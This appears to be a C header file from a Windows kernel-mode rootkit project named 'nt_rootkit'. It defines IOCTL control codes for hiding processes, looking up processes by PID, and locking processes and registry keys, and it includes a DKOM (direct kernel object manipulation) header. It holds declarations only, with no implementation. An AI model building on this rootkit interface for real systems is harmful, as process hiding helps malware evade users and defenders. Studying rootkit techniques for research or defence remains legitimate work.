/*
 * ioctl.h
 *
 * Description: Defines IRP and driver object controls.
 */

#ifndef _IOCTL_H_
#define _IOCTL_H_

#include <ntddk.h>
#include "dkom.h"
#include "lock_proc.h"
#include "lock_key.h"

#define DRIVER_PREFIX       "nt_rootkit: "

#define IO_HIDE_PROC        CTL_CODE(FILE_DEVICE_UNKNOWN, 0x2890, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IO_PID_PROC         CTL_CODE(FILE_DEVICE_UNKNOWN, 0x2891, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IO_LOCK_PROC        CTL_CODE(FILE_DEVICE_UNKNOWN, 0x2892, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IO_LOCK_KEY         CTL_CODE(FILE_DEVICE_UNKNOWN, 0x2893, METHOD_BUFFERED, FILE_ANY_ACCESS)

DRIVER_DISPATCH nt_rootkit_ioctl;

NTSTATUS nt_rootkit_create_close(PDEVICE_OBJECT dev_obj, PIRP irp);

NTSTATUS nt_rootkit_ioctl(PDEVICE_OBJECT dev_obj, PIRP irp);

#endif